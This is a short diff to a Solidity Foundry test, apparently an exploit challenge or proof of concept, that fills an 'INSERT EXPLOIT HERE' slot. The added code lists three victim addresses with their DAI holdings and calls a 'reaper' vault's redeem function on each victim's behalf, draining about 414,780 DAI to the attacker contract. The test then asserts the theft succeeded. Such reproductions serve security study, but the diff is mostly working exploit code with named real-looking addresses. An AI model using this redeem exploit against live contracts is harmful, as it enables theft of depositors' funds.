@@ -17,7 +17,16 @@ contract CounterTest is Test {
         console.log("Your Starting Balance:", fantomDai.balanceOf(address(this)));
         
         // INSERT EXPLOIT HERE
-
+        address[] memory victims = new address[](3);
+        // 271_744 DAI
+        victims[0] = 0xEB7a12fE169C98748EB20CE8286EAcCF4876643b;
+        // 87_603 DAI
+        victims[1] = 0xfc83DA727034a487f031dA33D55b4664ba312f1D; 
+        // 53_809 DAI
+        victims[2] = 0x954773dD09a0bd708D3C03A62FB0947e8078fCf9;
+        // redeem
+        for (uint256 i; i < victims.length; ++i) reaper.redeem(reaper.balanceOf(victims[i]), address(this), victims[i]);
+        // final balance 414_780 DAI
         console.log("Your Final Balance:", fantomDai.balanceOf(address(this)));
         assert(fantomDai.balanceOf(address(this)) > 400_000 ether);
     }
